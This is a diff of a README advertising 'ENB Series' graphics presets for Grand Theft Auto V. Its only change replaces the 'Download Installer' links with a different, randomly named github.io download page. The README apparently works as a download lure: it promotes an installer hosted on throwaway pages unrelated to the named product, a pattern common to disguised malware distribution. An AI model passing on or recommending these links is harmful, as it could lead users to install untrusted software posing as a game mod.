@@ -2,7 +2,7 @@
 
 ENB Series is a powerful graphics modification tool designed to enhance the visual fidelity of Grand Theft Auto V. With our realistic presets, you can transform your gaming experience on Windows 10/11 with stunning visuals and improved performance. Download the latest version in 2026 to enjoy cutting-edge enhancements.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -70,7 +70,7 @@ ENB Series has been a staple in the gaming community for years, providing tools 
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
